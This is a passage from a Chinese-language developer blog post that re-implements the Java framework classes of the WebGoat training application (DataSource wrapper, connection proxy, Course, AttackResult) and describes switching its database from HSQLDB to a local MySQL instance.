function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        originalDataSource.setLoginTimeout(seconds);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> originalDataSource.getLoginTimeout();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">        <span class="keyword">return</span> originalDataSource.getParentLogger();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">unwrap</span><span class="params">(Class&lt;T&gt; iface)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> originalDataSource.unwrap(iface);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isWrapperFor</span><span class="params">(Class&lt;?&gt; iface)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> originalDataSource.isWrapperFor(iface);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="lessons-3"><a href="#lessons-3" class="headerlink" title="lessons"></a>lessons</h2><h3 id="LessonConnectionInvocationHandler"><a href="#LessonConnectionInvocationHandler" class="headerlink" title="LessonConnectionInvocationHandler"></a>LessonConnectionInvocationHandler</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.lessons;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.WebGoatUser;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.context.SecurityContextHolder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="comment">//日志系统</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonConnectionInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Connection targetConnection;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LessonConnectionInvocationHandler</span><span class="params">(Connection targetConnection)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.targetConnection = targetConnection;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">authentication</span> <span class="operator">=</span> SecurityContextHolder.getContext().getAuthentication();</span><br><span class="line"><span class="comment">//        进行身份验证的?</span></span><br><span class="line">        <span class="keyword">if</span> (authentication != <span class="literal">null</span> &amp;&amp; authentication.getPrincipal() <span class="keyword">instanceof</span> WebGoatUser user)&#123;</span><br><span class="line"><span class="comment">//            如果拿到的对象输入webgoatuser就执行</span></span><br><span class="line">            <span class="keyword">try</span>(<span class="type">var</span> <span class="variable">statement</span> <span class="operator">=</span> targetConnection.createStatement())&#123;</span><br><span class="line">                statement.execute(<span class="string">&quot;SET SCHEMA \&quot;&quot;</span> + user.getUsername() + <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line"><span class="comment">//                使模式成为SQL控制台会话的默认模式。如果不使用此语句，则会将默认模式视为用户模式。如果您正在使用系统用户，则很危险。</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> method.invoke(targetConnection,args);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (InvocationTargetException e)&#123;</span><br><span class="line">            <span class="keyword">throw</span> e.getTargetException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="启动一下"><a href="#启动一下" class="headerlink" title="启动一下"></a>启动一下</h1><p>主要db下的目录要进行更改,并复制一个sql文件过来,否则无法正常启动</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713132111818.png" alt="image-20220713132111818"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713132146615.png" alt="image-20220713132146615"></p>
<h1 id="更改数据库为mysql"><a href="#更改数据库为mysql" class="headerlink" title="更改数据库为mysql"></a>更改数据库为mysql</h1><p>我实在是没搞懂这个hsqldb是咋访问的 我们先更改webgoat项目</p>
<p>添加依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.17<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713132847377.png" alt="image-20220713132847377"></p>
<p>创建数据库</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713132712936.png" alt="image-20220713132712936"></p>
<p>修改properties文件</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/webgoat?serverTimezone=GMT%2B8&amp;characterEncoding=utf8&amp;useSSL=true</span></span><br><span class="line"><span class="attr">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">spring.datasource.password</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br></pre></td></tr></table></figure>

<p>一看这三个肯定都是要更改的</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713133100515.png" alt="image-20220713133100515"></p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring.jpa.database-platform</span>=<span class="string">org.hibernate.dialect.MySQL5Dialect</span></span><br><span class="line"><span class="attr">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/webgoat?serverTimezone=GMT%2B8&amp;characterEncoding=utf8&amp;useSSL=true</span></span><br><span class="line"><span class="attr">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">spring.datasource.password</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713133236412.png" alt="image-20220713133236412"></p>
<p>这样启动会爆第一个错误 大概意思是sql语法错误,说明前后我们使用的数据库不同</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713212446172.png" alt="image-20220713212446172"></p>
<p>我们先删除这个两个sql文件 备份哦</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713212550955.png" alt="image-20220713212550955"></p>
<p>很明显这样启动也不会有好结果,这是因为我们数据库里并没有这些表</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713212708628.png" alt="image-20220713212708628"></p>
<p>那么我们现在需要去手动添加上这些表</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220714144857063.png" alt="image-20220714144857063"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713212900593.png" alt="image-20220713212900593"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713212916444.png" alt="image-20220713212916444"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713212943887.png" alt="image-20220713212943887"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213018476.png" alt="image-20220713213018476"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213038848.png" alt="image-20220713213038848"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213258184.png" alt="image-20220713213258184"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213316115.png" alt="image-20220713213316115"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213326142.png" alt="image-20220713213326142"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213348775.png" alt="image-20220713213348775"></p>
<p>有关联关系 你不会不会执行吧?</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713213506799.png" alt="image-20220713213506799"></p>
<p>发现注册的时候报错了 </p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713222315600.png" alt="image-20220713222315600"></p>
<p>但是用户注册上了</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220713222347793.png" alt="image-20220713222347793"></p>
<h1 id="server"><a href="#server" class="headerlink" title="server"></a>server</h1><h2 id="StartWebGoat"><a href="#StartWebGoat" class="headerlink" title="StartWebGoat"></a>StartWebGoat</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.hsqldb.lib.StringUtil;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.event.ApplicationReadyEvent;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.event.ContextStoppedEvent;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.event.EventListener;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="comment">// 把普通破击实例化到spring容器中</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="comment">//自动生成无参构造函数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StartupMessage</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String port;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line">    <span class="meta">@EventListener</span></span><br><span class="line"><span class="comment">//    用于事件的监听</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">onStartup</span><span class="params">(ApplicationReadyEvent event)</span>&#123;</span><br><span class="line"><span class="comment">//        这里是启动时做的事情</span></span><br><span class="line">        <span class="keyword">if</span> (StringUtils.hasText(port) &amp;&amp; !StringUtils.hasText(System.getProperty(<span class="string">&quot;running.in.docker&quot;</span>)))&#123;</span><br><span class="line"><span class="comment">//            运行在docker</span></span><br><span class="line">            log.info(<span class="string">&quot;Please browse to http://&#123;&#125;:&#123;&#125;/WebGoat to get started...&quot;</span>,address,port);</span><br><span class="line"><span class="comment">//            打出日志</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (event.getApplicationContext().getApplicationName().contains(<span class="string">&quot;WebGoat&quot;</span>))&#123;</span><br><span class="line">            port = event.getApplicationContext().getEnvironment().getProperty(<span class="string">&quot;server.port&quot;</span>);</span><br><span class="line">            address = event.getApplicationContext().getEnvironment().getProperty(<span class="string">&quot;server.address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@EventListener</span></span><br><span class="line">    <span class="keyword">void</span>  <span class="title function_">onShutdown</span><span class="params">(ContextStoppedEvent event)</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220714162530862.png" alt="image-20220714162530862"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220714163628605.png" alt="image-20220714163628605"></p>
<h1 id="container-3"><a href="#container-3" class="headerlink" title="container"></a>container</h1><h2 id="HammerHead"><a href="#HammerHead" class="headerlink" title="HammerHead"></a>HammerHead</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.Course;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HammerHead</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Course course;</span><br><span class="line">    <span class="meta">@RequestMapping(path = &quot;/attack&quot;,method = &#123;RequestMethod.GET,RequestMethod.POST&#125;)</span></span><br><span class="line"><span class="comment">//   接受/attack 的get和post请求</span></span><br><span class="line">    <span class="keyword">public</span> ModelAndView <span class="title function_">attack</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//        视图层和数据层</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>(<span class="string">&quot;redirect:&quot;</span>+<span class="string">&quot;start.mvc&quot;</span> + course.getFirstLesson().getLink());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="session-2"><a href="#session-2" class="headerlink" title="session"></a>session</h2><h3 id="Course"><a href="#Course" class="headerlink" title="Course"></a>Course</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.session;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Category;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Course</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Lesson&gt; lessons;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Course</span><span class="params">(List&lt;Lesson&gt; lessons)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.lessons = lessons;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Category&gt; <span class="title function_">getCategories</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> lessons.parallelStream().map(Lesson::getCategory).distinct().sorted().toList();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Lesson <span class="title function_">getFirstLesson</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getLessons(getCategories().get(<span class="number">0</span>)).get(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> List&lt;Lesson&gt; <span class="title function_">getLessons</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.lessons;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> List&lt;Lesson&gt; <span class="title function_">getLessons</span><span class="params">(Category category)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.lessons.stream().filter(l-&gt;l.getCategory() == category).toList();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLessons</span><span class="params">(List&lt;Lesson&gt; lessons)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.lessons = lessons;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getTotalOfLessons</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.lessons.size();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getTotalOfAssignments</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.lessons.stream().reduce(<span class="number">0</span>,(total,lessons) -&gt; lessons.getAssignments().size() + total,Integer::sum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="assignments"><a href="#assignments" class="headerlink" title="assignments"></a>assignments</h2><h3 id="AssignmentHints"><a href="#AssignmentHints" class="headerlink" title="AssignmentHints"></a>AssignmentHints</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.assignments;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="comment">//注解作用于接口 类 枚举</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="comment">//注解不仅被保存到class文件中,jvm加载class文件之后依然存在</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> AssignmentHints &#123;</span><br><span class="line">    String[] value() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="AssignmentPath"><a href="#AssignmentPath" class="headerlink" title="AssignmentPath"></a>AssignmentPath</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.assignments;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="comment">//存放在接口 类 枚举</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> AssignmentPath &#123;</span><br><span class="line">    String[] path() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">    RequestMethod[] method() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">    String <span class="title function_">value</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="AssignmentEndpoint"><a href="#AssignmentEndpoint" class="headerlink" title="AssignmentEndpoint"></a>AssignmentEndpoint</h3><h3 id="AttackResult"><a href="#AttackResult" class="headerlink" title="AttackResult"></a>AttackResult</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.assignments;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.i18n.PluginMessages;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.apache.commons.text.StringEscapeUtils.escapeJson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AttackResult</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">AttackResultBuilder</span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">boolean</span> lessonCompleted;</span><br><span class="line"><span class="comment">//        关卡是否完成</span></span><br><span class="line">        <span class="keyword">private</span> PluginMessages messages;</span><br><span class="line">        <span class="keyword">private</span> Object[] feedbackArgs;</span><br><span class="line">        <span class="keyword">private</span> String feedbackResourceBundleKey;</span><br><span class="line">        <span class="keyword">private</span> String output;</span><br><span class="line">        <span class="keyword">private</span> Object[] outputArgs;</span><br><span class="line">        <span class="keyword">private</span> AssignmentEndpoint assignment;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">boolean</span> <span class="variable">attemptWasMade</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">AttackResultBuilder</span> <span class="params">(PluginMessages messages)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.messages = messages;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> AttackResultBuilder <span class="title function_">lessonCompleted</span><span class="params">(<span class="type">boolean</span> lessonCompleted)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.lessonCompleted = lessonCompleted;</span><br><span class="line">            <span class="built_in">this</span>.feedbackResourceBundleKey = <span class="string">&quot;lesson.completed&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> AttackResultBuilder <span class="title function_">leslessonCompleted</span><span class="params">(<span class="type">boolean</span> lessonCompleted,String resourceBundleKey)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.lessonCompleted = lessonCompleted;</span><br><span class="line">            <span class="built_in">this</span>.feedbackResourceBundleKey = resourceBundleKey;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> AttackResultBuilder <span class="title function_">feedbackArgs</span><span class="params">(Object... args)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.feedbackArgs = args;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> AttackResultBuilder <span class="title function_">feedback</span><span class="params">(String resourceBundleKey)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.feedbackResourceBundleKey = resourceBundleKey;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> AttackResultBuilder <span class="title function_">output</span><span class="params">(String output)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.output = output;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> AttackResultBuilder <span class="title function_">outputArgs</span><span class="params">(Object... args)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.outputArgs = args;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> AttackResultBuilder <span class="title function_">attemptWasMade</span><span class="params">()</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.attemptWasMade = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> AttackResult <span class="title function_">build</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AttackResult</span>(lessonCompleted, messages.getMessage(feedbackResourceBundleKey, feedbackArgs), messages.getMessage(output, output, outputArgs), assignment.getClass().getSimpleName(), attemptWasMade);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> AttackResultBuilder <span class="title function_">assignment</span><span class="params">(AssignmentEndpoint assignment)</span>&#123;</span><br><span class="line">            <span class="built_in">this</span>.assignment = assignment;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> lessonCompleted;</span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> String feedback;</span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> String output;</span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String assignment;</span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> attemptWasMade;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AttackResult</span><span class="params">(<span class="type">boolean</span> lessonCompleted,String feedback, String output,String assignment,<span class="type">boolean</span> attemptWasMade)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.lessonCompleted = lessonCompleted;</span><br><span class="line">        <span class="built_in">this</span>.feedback = escapeJson(feedback);</span><br><span class="line">        <span class="built_in">this</span>.output = escapeJson(output);</span><br><span class="line">        <span class="built_in">this</span>.assignment = assignment;</span><br><span class="line">        <span class="built_in">this</span>.attemptWasMade = attemptWasMade;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  AttackResultBuilder <span class="title function_">builder</span><span class="params">(PluginMessages messages)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">AttackResultBuilder</span>(messages);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">assignmentSolved</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> lessonCompleted;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="LessonTrackerInterceptor"><a href="#LessonTrackerInterceptor" class="headerlink" title="LessonTrackerInterceptor"></a>LessonTrackerInterceptor</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.assignments;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.session.WebSession;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTracker;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.UserTrackerRepository;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.MethodParameter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.converter.HttpMessageConverter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.ServerHttpResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestControllerAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.ResponseBodyAdvice;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonTrackerInterceptor</span> <span class="keyword">implements</span> <span class="title class_">ResponseBodyAdvice</span>&lt;Object&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> UserTrackerRepository userTrackerRepository;</span><br><span class="line">    <span class="keyword">private</span> WebSession webSession;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LessonTrackerInterceptor</span><span class="params">(UserTrackerRepository userTrackerRepository,WebSession webSession)</span>&#123;</span><br><span class="line">        <span 